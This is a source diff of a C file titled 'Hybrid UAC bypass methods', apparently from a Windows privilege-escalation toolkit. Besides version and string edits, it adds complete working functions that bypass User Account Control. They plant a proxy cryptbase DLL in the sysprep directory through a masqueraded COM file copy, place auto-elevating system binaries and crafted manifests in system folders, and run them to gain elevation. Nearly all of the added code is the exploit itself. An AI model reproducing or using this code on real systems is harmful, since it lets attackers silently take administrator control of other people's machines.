@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.10
+*  VERSION:     2.20
 *
-*  DATE:        16 Apr 2016
+*  DATE:        25 May 2016
 *
 *  Hybrid UAC bypass methods.
 *
@@ -18,6 +18,7 @@
 *******************************************************************************/
 #include "global.h"
 #include "makecab.h"
+#include "manifest.h"
 
 ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;
 
@@ -166,7 +167,7 @@ BOOL ucmWinSATMethod(
 
         // Copy winsat to temp directory
         if (!CopyFile(szSource, szDest, FALSE)) {
-            OutputDebugString(L"[UCM] Target application not found");
+            OutputDebugString(T_TARGETNOTFOUND);
             break;
         }
 
@@ -230,8 +231,6 @@ BOOL ucmWinSATMethod(
     } while (cond);
 
     if (bResult) {
-
-        NtYieldExecution();//put your signature here
 
         //run winsat
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
@@ -636,5 +635,195 @@ BOOL ucmGWX(
     if (Data != NULL) {
         VirtualFree(Data, 0, MEM_RELEASE);
     }
+    return bResult;
+}
+
+/*
+* ucmAutoElevateManifestDropDll
+*
+* Purpose:
+*
+* Drop target dll for ucmAutoElevateManifest.
+*
+*/
+BOOL ucmAutoElevateManifestDropDll(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
+{
+    WCHAR szDest[MAX_PATH * 2];
+    WCHAR szSource[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(szSource, sizeof(szSource));
+    _strcpy(szSource, g_ctx.szTempDirectory);
+    _strcat(szSource, CRYPTBASE_DLL);
+    if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
+        return FALSE;
+    }
+    RtlSecureZeroMemory(szDest, sizeof(szDest));
+    _strcpy(szDest, g_ctx.szSystemDirectory);
+    _strcat(szDest, SYSPREP_DIR);
+    return ucmMasqueradedCopyFileCOM(szSource, szDest);
+}
+
+/*
+* ucmAutoElevateManifestW7
+*
+* Purpose:
+*
+* Special case for Windows 7.
+*
+*/
+BOOL ucmAutoElevateManifestW7(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
+{
+    DWORD d;
+    BOOL bResult = FALSE, bCond = FALSE;
+    WCHAR szDest[MAX_PATH * 2];
+    WCHAR szSource[MAX_PATH * 2];
+    LPWSTR lpApplication = NULL;
+
+    do {
+
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        RtlSecureZeroMemory(szDest, sizeof(szDest));
+
+        _strcpy(szSource, g_ctx.szSystemDirectory);
+        _strcpy(szDest, g_ctx.szTempDirectory);
+
+        
+        lpApplication = TASKHOST_EXE;//doesn't really matter, Yuubari module lists multiple targets
+        _strcat(szSource, lpApplication);
+        _strcat(szDest, lpApplication);
+
+        // Copy target to temp directory
+        if (!CopyFile(szSource, szDest, FALSE)) {
+            d = GetLastError();
+            OutputDebugString(T_TARGETNOTFOUND);
+            break;
+        }
+        _strcpy(szSource, szDest);
+
+        // Copy target app to windir
+        RtlSecureZeroMemory(szDest, sizeof(szDest));
+        _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
+        _strcat(szDest, TEXT("\\"));
+        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        if (!bResult) {
+            break;
+        }
+
+        bResult = ucmAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
+        if (!bResult) {
+            break;
+        }
+
+        //put target manifest
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        _strcpy(szSource, g_ctx.szTempDirectory);
+        _strcat(szSource, lpApplication);
+        _strcat(szSource, MANIFEST_EXT);
+        if (!supWriteBufferToFile(szSource, (PVOID)ManifestData, sizeof(ManifestData))) {
+            break;
+        }
+
+        RtlSecureZeroMemory(szDest, sizeof(szDest));
+        _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
+        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        if (!bResult) {
+            break;
+        }
+
+        _strcat(szDest, L"\\");
+        _strcat(szDest, lpApplication);
+        bResult = supRunProcess(szDest, NULL);       
+
+    } while (bCond);
+
+    return bResult;
+}
+
+/*
+* ucmAutoElevateManifest
+*
+* Purpose:
+*
+* Bypass UAC by abusing appinfo whitelist and SXS undocumented feature.
+* Ironically revealed by Microsoft itself in their attempt to fix UAC exploit.
+* Supported at Windows 7 minimum (older versions not checked).
+*
+*/
+BOOL ucmAutoElevateManifest(
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
+{
+    BOOL bResult = FALSE, bCond = FALSE;
+    WCHAR szDest[MAX_PATH * 2];
+    WCHAR szSource[MAX_PATH * 2];
+    LPWSTR lpApplication = NULL;
+
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
+        return bResult;
+
+    do {
+
+        if (g_ctx.dwBuildNumber < 9600) {
+            bResult = ucmAutoElevateManifestW7(ProxyDll, ProxyDllSize);
+            break;
+        }
+
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        RtlSecureZeroMemory(szDest, sizeof(szDest));
+
+        _strcpy(szSource, g_ctx.szSystemDirectory);
+        _strcpy(szDest, g_ctx.szTempDirectory);
+        _strcat(szSource, TZSYNC_EXE); //doesn't really matter, Yuubari module lists multiple targets
+        lpApplication = MIGWIZ_EXE;
+        _strcat(szDest, lpApplication);
+
+        // Copy target to temp directory
+        if (!CopyFile(szSource, szDest, FALSE)) {
+            OutputDebugString(T_TARGETNOTFOUND);
+            break;
+        }
+        _strcpy(szSource, szDest);
+
+        // Copy target app to home
+        RtlSecureZeroMemory(szDest, sizeof(szDest));
+        _strcpy(szDest, g_ctx.szSystemDirectory);
+        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        if (!bResult) {
+            break;
+        }
+        
+        bResult = ucmAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
+        if (!bResult) {
+            break;
+        }
+
+        //put target manifest
+        RtlSecureZeroMemory(szSource, sizeof(szSource));
+        _strcpy(szSource, g_ctx.szTempDirectory);
+        _strcat(szSource, lpApplication);
+        _strcat(szSource, MANIFEST_EXT);
+        if (!supWriteBufferToFile(szSource, (PVOID)ManifestData, sizeof(ManifestData))) {
+            break;
+        }
+        RtlSecureZeroMemory(szDest, sizeof(szDest));
+        _strcpy(szDest, g_ctx.szSystemDirectory);
+        bResult = ucmMasqueradedCopyFileCOM(szSource, szDest);
+        if (!bResult) {
+            break;
+        }
+
+        _strcpy(szDest, g_ctx.szSystemDirectory);
+        _strcat(szDest, lpApplication);
+        bResult = supRunProcess(szDest, NULL);
+
+    } while (bCond);
+
     return bResult;
 }
